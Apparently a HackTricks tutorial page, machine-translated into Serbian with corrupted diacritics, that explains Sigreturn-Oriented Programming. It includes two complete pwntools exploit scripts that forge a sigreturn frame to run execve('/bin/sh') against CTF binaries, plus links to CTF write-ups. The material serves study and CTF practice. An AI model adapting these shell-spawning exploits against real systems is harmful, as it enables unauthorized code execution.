# SROP - Sigreturn-Oriented Programming

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

**`Sigreturn`** je poseban **sistemski poziv (syscall)** koji se uglavnom koristi za 캜i코캖enje nakon 코to je rukovalac signala zavr코io svoje izvr코avanje. Signali su prekidi koje operativni sistem 코alje programu, 캜esto da bi ukazao da se desila neka izuzetna situacija. Kada program primi signal, privremeno pauzira svoj trenutni rad kako bi obradio signal pomo캖u **rukovaoca signala**, posebne funkcije dizajnirane za rukovanje signalima.

Nakon 코to rukovalac signala zavr코i, program mora da **nastavi svoje prethodno stanje** kao da se ni코ta nije desilo. Tu dolazi do izra쬬ja **`sigreturn`**. Poma쬰 programu da **vrati se iz rukovaoca signala** i vra캖a stanje programa 캜i코캖enjem okvira steka (sekcija memorije koja 캜uva pozive funkcija i lokalne promenljive) koji je kori코캖en od strane rukovaoca signala.

Interesantan deo je kako **`sigreturn`** vra캖a stanje programa: to 캜ini tako 코to **sve vrednosti registara CPU-a 캜uva na steku.** Kada signal vi코e nije blokiran, **`sigreturn` izbacuje ove vrednosti sa steka**, efikasno resetuju캖i registre CPU-a na njihovo stanje pre rukovanja signalom. To uklju캜uje registar pokaziva캜a steka (RSP), koji pokazuje na trenutni vrh steka.

{% hint style="opasnost" %}
Pozivanjem sistemskog poziva **`sigreturn`** iz ROP lanca i **dodavanjem vrednosti registara** koje 쬰limo da u캜ita na **stek** mogu캖e je **kontrolisati** sve vrednosti registara i stoga **pozvati** na primer sistemski poziv `execve` sa `/bin/sh`.
{% endhint %}

Primetite kako bi ovo bio **tip Ret2syscall** koji olak코ava kontrolisanje parametara za pozivanje drugih Ret2syscall-ova:

{% content-ref url="../rop-syscall-execv/" %}
[rop-syscall-execv](../rop-syscall-execv/)
{% endcontent-ref %}

Ako ste radoznali, ovo je **struktura sigcontext-a** sme코tena na steku kako bi se kasnije povratile vrednosti (dijagram sa [**ovde**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Za bolje obja코njenje pogledajte i:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Primer

Mo쬰te [**prona캖i primer ovde**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) gde je poziv za signeturn konstruisan putem ROP-a (stavljanjem vrednosti `0xf` u rxa), iako je ovo kona캜an eksploit od tamo:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Proverite i [**exploit ovde**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) gde je binarni fajl ve캖 pozivao `sigreturn` i stoga nije potrebno to izgraditi sa **ROP**:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## Ostali primeri i reference

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* Binarni fajl na asembleru koji omogu캖ava **pisanje na stek** i zatim poziva **`sigreturn`** sistemski poziv. Mogu캖e je pisati na stek [**ret2syscall**](../rop-syscall-execv/) putem **sigreturn** strukture i pro캜itati zastavu koja se nalazi u memoriji binarnog fajla.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* Binarni fajl na asembleru koji omogu캖ava **pisanje na stek** i zatim poziva **`sigreturn`** sistemski poziv. Mogu캖e je pisati na stek [**ret2syscall**](../rop-syscall-execv/) putem **sigreturn** strukture (binarni fajl sadr쬴 string `/bin/sh`).
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 bita, bez relro-a, bez canary-ja, nx, bez pie-a. Jednostavno preplavljivanje bafera zloupotrebom `gets` funkcije sa nedostatkom ged쬰ta koji izvr코ava [**ret2syscall**](../rop-syscall-execv/). ROP lanac upisuje `/bin/sh` u `.bss` pozivaju캖i ponovo gets, zloupotrebljava **`alarm`** funkciju da postavi eax na `0xf` kako bi pozvao **SROP** i izvr코io shell.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64 bitni program na asembleru, bez relro-a, bez canary-ja, nx, bez pie-a. Tok omogu캖ava pisanje na stek, kontrolu nekoliko registara, poziv sistemskog poziva i zatim poziva `exit`. Izabrani sistemski poziv je `sigreturn` koji 캖e postaviti registre i premestiti `eip` da pozove prethodnu instrukciju sistema i pokrene `memprotect` da postavi prostor binarnog fajla na `rwx` i postavi ESP u prostor binarnog fajla. Nastavljaju캖i tok, program 캖e ponovo pozvati read u ESP, ali u ovom slu캜aju ESP 캖e pokazivati na slede캖u instrukciju tako da 캖e prosle캠ivanje shell koda napisati ga kao slede캖u instrukciju i izvr코iti je.
* [https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection)
* SROP se koristi da se daju privilegije izvr코avanja (memprotect) na mestu gde je sme코ten shell kod.
